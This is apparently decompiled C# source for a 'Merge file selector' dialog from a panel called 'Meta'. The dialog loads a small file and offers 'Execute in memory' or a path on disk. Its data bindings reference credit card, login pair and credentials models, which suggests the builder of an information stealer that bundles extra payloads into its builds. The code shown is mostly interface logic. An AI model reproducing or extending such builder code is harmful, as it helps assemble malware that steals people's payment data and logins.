using GuiLib;
using Meta.MainPanel.Data.Extensions;
using Meta.MainPanel.Models.Shared;
using MetroSet_UI.Controls;
using System;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Meta.MainPanel.Views;

public class MergeFilesConfigFrm : Form
{
    public MergeFile CurrentMergeFile = new MergeFile();

    private object object_0;

    private object topHeader;

    private object mainTitle;

    private object closeBtn;

    private object object_1;

    private object object_2;

    private object logContextMenu;

    private object copyToolStripMenuItem;

    private object object_3;

    private object a;

    private object b;

    private object c;

    private object d;

    private object e;

    private object f;

    private object targetPathTb;

    private object targetPathLbl;

    public MergeFilesConfigFrm()
    {
        InitializeComponent();
        this.AllowDraggBy((Control)topHeader);
        this.ApplyShadows();
    }

    private void closeBtn_Click(object sender, object e)
    {
        base.DialogResult = DialogResult.Cancel;
        Close();
    }

    private void topHeader_Paint(object sender, object e)
    {
        int num = ((Control)topHeader).Width - 1;
        int num2 = ((Control)topHeader).Height - 1;
        Pen pen = new Pen(ColorPicker.ThemeColor, 3f);
        ((PaintEventArgs)e).Graphics.DrawRectangle(pen, 0, 0, num, num2);
    }

    private void MergeFilesConfigFrm_Paint(object sender, object e)
    {
        int num = base.Width - 1;
        int num2 = base.Height - 1;
        Pen pen = new Pen(ColorPicker.ThemeColor, 3f);
        ((PaintEventArgs)e).Graphics.DrawRectangle(pen, 0, 0, num, num2);
    }

    private void a_Click(object sender, object e)
    {
        CurrentMergeFile.ExecuteInMemory = ((MetroSetCheckBox)b).Checked;
        CurrentMergeFile.FilePath = ((AnimaTextBox)targetPathTb).Text;
        CurrentMergeFile.PathOnDisk = ((AnimaTextBox)d).Text;
        base.DialogResult = DialogResult.OK;
        Close();
    }

    private async void f_Click(object sender, object e)
    {
        await Task.Factory.StartNew(delegate
        {
            try
            {
                Invoke((MethodInvoker)delegate
                {
                    ((AnimaTextBox)targetPathTb).Text = "";
                });
                CurrentMergeFile.Body = null;
                OpenFileDialog ofd = new OpenFileDialog();
                try
                {
                    ofd.Filter = "All files (*.*)|*.*";
                    ofd.CheckPathExists = true;
                    ofd.InitialDirectory = Directory.GetCurrentDirectory();
                    ofd.RestoreDirectory = true;
                    ofd.Multiselect = false;
                    Invoke((MethodInvoker)delegate
                    {
                        if (ofd.ShowDialog(this) == DialogResult.OK)
                        {
                            if (new FileInfo(ofd.FileName).Length > 512000L)
                            {
                                MessageBox.Show(this, "File must be less then 500kb");
                            }
                            else
                            {
                                ((AnimaTextBox)targetPathTb).Text = ofd.FileName;
                                CurrentMergeFile.Body = File.ReadAllBytes(((AnimaTextBox)targetPathTb).Text);
                            }
                        }
                    });
                }
                finally
                {
                    if (ofd != null)
                    {
                        ((IDisposable)ofd).Dispose();
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, "Error: " + ex.Message);
            }
        });
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && object_0 != null)
        {
            ((IDisposable)object_0).Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        this.object_0 = new System.ComponentModel.Container();
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Meta.MainPanel.Views.MergeFilesConfigFrm));
        this.topHeader = new System.Windows.Forms.Panel();
        this.mainTitle = new System.Windows.Forms.Label();
        this.closeBtn = new System.Windows.Forms.Label();
        this.logContextMenu = new System.Windows.Forms.ContextMenuStrip((System.ComponentModel.IContainer)this.object_0);
        this.copyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.object_3 = new System.Windows.Forms.BindingSource((System.ComponentModel.IContainer)this.object_0);
        this.object_2 = new System.Windows.Forms.BindingSource((System.ComponentModel.IContainer)this.object_0);
        this.object_1 = new System.Windows.Forms.BindingSource((System.ComponentModel.IContainer)this.object_0);
        this.a = new MetroSet_UI.Controls.MetroSetButton();
        this.b = new MetroSet_UI.Controls.MetroSetCheckBox();
        this.c = new System.Windows.Forms.Label();
        this.d = new GuiLib.AnimaTextBox();
        this.e = new System.Windows.Forms.Label();
        this.f = new MetroSet_UI.Controls.MetroSetButton();
        this.targetPathTb = new GuiLib.AnimaTextBox();
        this.targetPathLbl = new System.Windows.Forms.Label();
        ((System.Windows.Forms.Control)this.topHeader).SuspendLayout();
        ((System.Windows.Forms.Control)this.logContextMenu).SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.object_3).BeginInit();
        ((System.ComponentModel.ISupportInitialize)this.object_2).BeginInit();
        ((System.ComponentModel.ISupportInitialize)this.object_1).BeginInit();
        base.SuspendLayout();
        ((System.Windows.Forms.Control)this.topHeader).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.Control)this.topHeader).Controls.Add((System.Windows.Forms.Control)this.mainTitle);
        ((System.Windows.Forms.Control)this.topHeader).Controls.Add((System.Windows.Forms.Control)this.closeBtn);
        ((System.Windows.Forms.Control)this.topHeader).Dock = System.Windows.Forms.DockStyle.Top;
        ((System.Windows.Forms.Control)this.topHeader).ForeColor = System.Drawing.Color.Silver;
        ((System.Windows.Forms.Control)this.topHeader).Location = new System.Drawing.Point(0, 0);
        ((System.Windows.Forms.Control)this.topHeader).Name = "topHeader";
        ((System.Windows.Forms.Control)this.topHeader).Size = new System.Drawing.Size(470, 30);
        ((System.Windows.Forms.Control)this.topHeader).TabIndex = 2;
        ((System.Windows.Forms.Control)this.topHeader).Paint += new System.Windows.Forms.PaintEventHandler(topHeader_Paint);
        ((System.Windows.Forms.Control)this.mainTitle).AutoSize = true;
        ((System.Windows.Forms.Control)this.mainTitle).Font = new System.Drawing.Font("Segoe UI", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.mainTitle).ForeColor = System.Drawing.Color.FromArgb(64, 224, 208);
        ((System.Windows.Forms.Control)this.mainTitle).Location = new System.Drawing.Point(3, 4);
        ((System.Windows.Forms.Control)this.mainTitle).Name = "mainTitle";
        ((System.Windows.Forms.Control)this.mainTitle).Size = new System.Drawing.Size(179, 20);
        ((System.Windows.Forms.Control)this.mainTitle).TabIndex = 2;
        ((System.Windows.Forms.Control)this.mainTitle).Text = "Meta | Merge file selector";
        ((System.Windows.Forms.Control)this.closeBtn).AutoSize = true;
        ((System.Windows.Forms.Control)this.closeBtn).Font = new System.Drawing.Font("Segoe UI Semibold", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.closeBtn).ForeColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.closeBtn).Location = new System.Drawing.Point(447, 3);
        ((System.Windows.Forms.Control)this.closeBtn).Name = "closeBtn";
        ((System.Windows.Forms.Control)this.closeBtn).Size = new System.Drawing.Size(20, 21);
        ((System.Windows.Forms.Control)this.closeBtn).TabIndex = 1;
        ((System.Windows.Forms.Control)this.closeBtn).Text = "X";
        ((System.Windows.Forms.Control)this.closeBtn).Click += new System.EventHandler(closeBtn_Click);
        ((System.Windows.Forms.ToolStrip)this.logContextMenu).Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { (System.Windows.Forms.ToolStripItem)this.copyToolStripMenuItem });
        ((System.Windows.Forms.Control)this.logContextMenu).Name = "logContextMenu";
        ((System.Windows.Forms.Control)this.logContextMenu).Size = new System.Drawing.Size(103, 26);
        ((System.Windows.Forms.ToolStripItem)this.copyToolStripMenuItem).Name = "copyToolStripMenuItem";
        ((System.Windows.Forms.ToolStripItem)this.copyToolStripMenuItem).Size = new System.Drawing.Size(102, 22);
        ((System.Windows.Forms.ToolStripItem)this.copyToolStripMenuItem).Text = "Copy";
        ((System.Windows.Forms.BindingSource)this.object_3).DataSource = typeof(Meta.SharedModels.CreditCard);
        ((System.Windows.Forms.BindingSource)this.object_2).DataSource = typeof(Meta.SharedModels.LoginPair);
        ((System.Windows.Forms.BindingSource)this.object_1).DataSource = typeof(Meta.SharedModels.Credentials);
        ((MetroSet_UI.Controls.MetroSetButton)this.a).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.a).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.a).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.a).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.a).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.a).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.a).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.a).Location = new System.Drawing.Point(348, 141);
        ((System.Windows.Forms.Control)this.a).Name = "saveBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.a).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.a).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.a).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.a).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.a).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.a).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.a).Size = new System.Drawing.Size(102, 20);
        ((MetroSet_UI.Controls.MetroSetButton)this.a).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.a).StyleManager = null;
        ((System.Windows.Forms.Control)this.a).TabIndex = 23;
        ((System.Windows.Forms.Control)this.a).Text = "Add";
        ((MetroSet_UI.Controls.MetroSetButton)this.a).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.a).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.a).Click += new System.EventHandler(a_Click);
        ((System.Windows.Forms.Control)this.b).BackColor = System.Drawing.Color.Transparent;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.b).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.b).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.b).Checked = true;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.b).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.b).CheckState = MetroSet_UI.Enums.CheckState.Checked;
        ((System.Windows.Forms.Control)this.b).Cursor = System.Windows.Forms.Cursors.Hand;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.b).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
        ((System.Windows.Forms.Control)this.b).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.b).Location = new System.Drawing.Point(124, 141);
        ((System.Windows.Forms.Control)this.b).Name = "eimCb";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.b).SignStyle = MetroSet_UI.Enums.SignStyle.Sign;
        ((System.Windows.Forms.Control)this.b).Size = new System.Drawing.Size(19, 16);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.b).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.b).StyleManager = null;
        ((System.Windows.Forms.Control)this.b).TabIndex = 148;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.b).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.b).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.c).AutoSize = true;
        ((System.Windows.Forms.Control)this.c).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.c).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.c).Location = new System.Drawing.Point(12, 141);
        ((System.Windows.Forms.Control)this.c).Name = "executeInMemoryLbl";
        ((System.Windows.Forms.Control)this.c).Size = new System.Drawing.Size(111, 15);
        ((System.Windows.Forms.Control)this.c).TabIndex = 147;
        ((System.Windows.Forms.Control)this.c).Text = "Execute in memory:";
        ((GuiLib.AnimaTextBox)this.d).Dark = false;
        ((System.Windows.Forms.Control)this.d).Location = new System.Drawing.Point(12, 105);
        ((GuiLib.AnimaTextBox)this.d).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.d).MultiLine = false;
        ((System.Windows.Forms.Control)this.d).Name = "pathOnDiskTb";
        ((GuiLib.AnimaTextBox)this.d).Numeric = false;
        ((GuiLib.AnimaTextBox)this.d).ReadOnly = false;
        ((System.Windows.Forms.Control)this.d).Size = new System.Drawing.Size(438, 23);
        ((System.Windows.Forms.Control)this.d).TabIndex = 145;
        ((GuiLib.AnimaTextBox)this.d).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.e).AutoSize = true;
        ((System.Windows.Forms.Control)this.e).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.e).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.e).Location = new System.Drawing.Point(12, 87);
        ((System.Windows.Forms.Control)this.e).Name = "buildPathLbl";
        ((System.Windows.Forms.Control)this.e).Size = new System.Drawing.Size(265, 15);
        ((System.Windows.Forms.Control)this.e).TabIndex = 144;
        ((System.Windows.Forms.Control)this.e).Text = "Path on Disk (if execute in memory isnt enabled):";
        ((MetroSet_UI.Controls.MetroSetButton)this.f).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.f).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.f).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.f).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.f).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.f).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.f).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.f).Location = new System.Drawing.Point(385, 59);
        ((System.Windows.Forms.Control)this.f).Name = "openTargetBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.f).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.f).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.f).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.f).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.f).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.f).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.f).Size = new System.Drawing.Size(65, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.f).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.f).StyleManager = null;
        ((System.Windows.Forms.Control)this.f).TabIndex = 143;
        ((System.Windows.Forms.Control)this.f).Text = "...";
        ((MetroSet_UI.Controls.MetroSetButton)this.f).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.f).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.f).Click += new System.EventHandler(f_Click);
        ((GuiLib.AnimaTextBox)this.targetPathTb).Dark = false;
        ((System.Windows.Forms.Control)this.targetPathTb).Location = new System.Drawing.Point(12, 59);
        ((GuiLib.AnimaTextBox)this.targetPathTb).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.targetPathTb).MultiLine = false;
        ((System.Windows.Forms.Control)this.targetPathTb).Name = "targetPathTb";
        ((GuiLib.AnimaTextBox)this.targetPathTb).Numeric = false;
        ((GuiLib.AnimaTextBox)this.targetPathTb).ReadOnly = true;
        ((System.Windows.Forms.Control)this.targetPathTb).Size = new System.Drawing.Size(367, 23);
        ((System.Windows.Forms.Control)this.targetPathTb).TabIndex = 142;
        ((GuiLib.AnimaTextBox)this.targetPathTb).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.targetPathLbl).AutoSize = true;
        ((System.Windows.Forms.Control)this.targetPathLbl).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.targetPathLbl).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.targetPathLbl).Location = new System.Drawing.Point(12, 41);
        ((System.Windows.Forms.Control)this.targetPathLbl).Name = "targetPathLbl";
        ((System.Windows.Forms.Control)this.targetPathLbl).Size = new System.Drawing.Size(55, 15);
        ((System.Windows.Forms.Control)this.targetPathLbl).TabIndex = 141;
        ((System.Windows.Forms.Control)this.targetPathLbl).Text = "File path:";
        base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
        base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        this.BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        base.ClientSize = new System.Drawing.Size(470, 176);
        base.Controls.Add((System.Windows.Forms.Control)this.b);
        base.Controls.Add((System.Windows.Forms.Control)this.c);
        base.Controls.Add((System.Windows.Forms.Control)this.d);
        base.Controls.Add((System.Windows.Forms.Control)this.e);
        base.Controls.Add((System.Windows.Forms.Control)this.f);
        base.Controls.Add((System.Windows.Forms.Control)this.targetPathTb);
        base.Controls.Add((System.Windows.Forms.Control)this.targetPathLbl);
        base.Controls.Add((System.Windows.Forms.Control)this.a);
        base.Controls.Add((System.Windows.Forms.Control)this.topHeader);
        base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
        base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
        base.Name = "MergeFilesConfigFrm";
        base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        this.Text = "Meta | Configurator";
        base.Paint += new System.Windows.Forms.PaintEventHandler(MergeFilesConfigFrm_Paint);
        ((System.Windows.Forms.Control)this.topHeader).ResumeLayout(false);
        ((System.Windows.Forms.Control)this.topHeader).PerformLayout();
        ((System.Windows.Forms.Control)this.logContextMenu).ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)this.object_3).EndInit();
        ((System.ComponentModel.ISupportInitialize)this.object_2).EndInit();
        ((System.ComponentModel.ISupportInitialize)this.object_1).EndInit();
        base.ResumeLayout(false);
        base.PerformLayout();
    }

    [CompilerGenerated]
    private void method_0()
    {
        try
        {
            Invoke((MethodInvoker)delegate
            {
                ((AnimaTextBox)targetPathTb).Text = "";
            });
            CurrentMergeFile.Body = null;
            OpenFileDialog ofd = new OpenFileDialog();
            try
            {
                ofd.Filter = "All files (*.*)|*.*";
                ofd.CheckPathExists = true;
                ofd.InitialDirectory = Directory.GetCurrentDirectory();
                ofd.RestoreDirectory = true;
                ofd.Multiselect = false;
                Invoke((MethodInvoker)delegate
                {
                    if (ofd.ShowDialog(this) == DialogResult.OK)
                    {
                        if (new FileInfo(ofd.FileName).Length > 512000L)
                        {
                            MessageBox.Show(this, "File must be less then 500kb");
                        }
                        else
                        {
                            ((AnimaTextBox)targetPathTb).Text = ofd.FileName;
                            CurrentMergeFile.Body = File.ReadAllBytes(((AnimaTextBox)targetPathTb).Text);
                        }
                    }
                });
            }
            finally
            {
                if (ofd != null)
                {
                    ((IDisposable)ofd).Dispose();
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.Message);
        }
    }

    [CompilerGenerated]
    private void method_1()
    {
        ((AnimaTextBox)targetPathTb).Text = "";
    }
}
